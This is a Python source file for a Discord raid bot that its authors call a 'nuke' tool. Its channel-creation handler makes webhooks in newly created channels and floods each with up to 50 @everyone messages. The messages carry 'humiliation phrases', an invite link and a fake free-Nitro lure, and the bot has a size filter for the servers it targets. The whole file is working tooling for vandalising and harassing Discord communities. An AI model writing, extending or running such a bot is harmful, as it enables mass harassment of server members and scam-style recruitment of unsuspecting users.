import discord
import aiohttp
import asyncio
import random
import os
from discord.ext import commands
from dotenv import load_dotenv
import json
from config import config

load_dotenv("opsec.env")
token=os.getenv("TOKEN")or config.get("token")
if not token:print("[!] No token found");exit(1)
intents=discord.Intents.all()
israel=commands.Bot(command_prefix=config.get("prefix","+"),intents=intents)
israel.remove_command('help')
israel.TOKEN=token
israel.nukeActive=False
israel.nukeTasks=[]
israel.nukeType="regular"
israel.oldNames={}
israel.exemptGuilds=config.get("exempt_guilds",[])
israel.currentNukeMsg="@everyone https://discord.gg/ccdyKy2mFA"
israel.ownerUsers=config.get("owner_users",[])
israel.logChannelId=config.get("log_channel_id")
israel.userConfigs={}
israel.embedImages=["https://i.supaimg.com/80274f0c-c5b2-45fc-8b2e-6b00fd5705cd.gif","https://i.supaimg.com/09599c5f-ce03-422a-a6c4-d997aa1a3feb.jpg"]
israel.boomThumbnail="https://i.supaimg.com/294ae07a-5e57-4ca4-b8ee-cf17bef8ea37.gif"
israel.nukeIconUrl="https://i.supaimg.com/d481cf71-fa30-4675-83c6-1a7847074aa2.jpg"
israel.awptWords=config.get("embeds.awpt_words",[])
israel.humiliationPhrases=config.get("embeds.humiliation_phrases",[])
israel.nukeChannelNames=config.get("nuke.channel_names",[])

def loadUserConfigs():
    if os.path.isfile('user_configs.json'):
        with open('user_configs.json','r')as f:israel.userConfigs=json.load(f)
    else:israel.userConfigs={}
def saveUserConfigs():
    with open('user_configs.json','w')as f:json.dump(israel.userConfigs,f,indent=2)
loadUserConfigs()

cogs=["free","premium","owner","logger"]
for cog in cogs:
    try:israel.load_extension(cog);print(f"✅ Loaded {cog}.py")
    except Exception as e:print(f"❌ Failed to load {cog}: {e}");import traceback;traceback.print_exc()

@israel.event
async def on_ready():
    loadUserConfigs()
    print(f"Logged in as {israel.user}")
    activity=discord.Activity(type=discord.ActivityType.streaming,name="ᴍᴀʟᴇᴠᴏʟᴇɴᴄᴇ",url="https://twitch.tv/peterwashere")
    await israel.change_presence(activity=activity)

@israel.event
async def on_command_error(ctx,error):
    if isinstance(error,commands.CommandOnCooldown):
        embed=discord.Embed(title="Cooldown",description=f"Try in {int(error.retry_after)} seconds",color=0x36393f)
        await ctx.send(embed=embed)
    elif isinstance(error,commands.CheckFailure):await ctx.send("No access to that command.")
    elif isinstance(error,commands.CommandNotFound):await ctx.send("Invalid command.")
    else:raise error

@israel.event
async def on_guild_join(guild):
    if guild.id in israel.exemptGuilds or guild.id in israel.joinBypassGuilds:
        return

    inviter=None
    try:
        async for entry in guild.audit_logs(limit=1,action=discord.AuditLogAction.bot_add):inviter=entry.user
    except:pass

    if guild.member_count<20:
        if not inviter or inviter.id not in israel.ownerUsers:
            if inviter:
                try:await inviter.send("Need 20+ members")
                except:pass
            await guild.leave()
            return

    async def autoLeave():
        await asyncio.sleep(3600)
        await guild.leave()
        channel=israel.get_channel(israel.logChannelId)
        if channel:
            embed=discord.Embed(title="Bot Left Server",description=f"Server: {guild.name}\nID: {guild.id}\nOwner: {guild.owner}\nMembers: {guild.member_count}",color=0xffa500)
            await channel.send(embed=embed)
    asyncio.create_task(autoLeave())
@israel.event
async def on_guild_channel_create(channel):
    if not israel.nukeActive:return
    async def spamWebhook():
        try:webhook=await channel.create_webhook(name="😹")
        except:return
        url=webhook.url
        async with aiohttp.ClientSession()as session:
            for i in range(50):
                if not israel.nukeActive:break
                if israel.nukeType=="regular":
                    embed1=discord.Embed(description=f"**{random.choice(israel.awptWords)} BY SANITY, {random.choice(israel.humiliationPhrases)}**\n\n__[Youtube](https://www.youtube.com/@squadrvn)__\n__[Server](https://discord.gg/ccdyKy2mFA)__",color=discord.Color.from_rgb(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
                    embed1.set_image(url=israel.embedImages[0])
                    embed1.set_thumbnail(url=israel.boomThumbnail)
                    embed2=discord.Embed(description="__[Youtube](https://www.youtube.com/@squadrvn)__\n__[Server](https://discord.gg/ccdyKy2mFA)__")
                    embed2.set_image(url=israel.embedImages[1])
                    if i%3==0:await session.post(url,json={"content":"@everyone https://discord.gg/ccdyKy2mFA","embeds":[embed1.to_dict()]})
                    elif i%3==1:await session.post(url,json={"content":"@everyone @here https://discord.gg/ccdyKy2mFA","embeds":[embed2.to_dict()]})
                    else:await session.post(url,json={"content":"@everyone \n# First to join gets __3 month nitro__ + __free security bot__ and free __decos__!\n# JOIN NOW \n # https://discord.gg/ccdyKy2mFA"})
                else:await session.post(url,json={"content":israel.currentNukeMsg})
    task=asyncio.create_task(spamWebhook())
    israel.nukeTasks.append(task)

if __name__=="__main__":israel.run(token)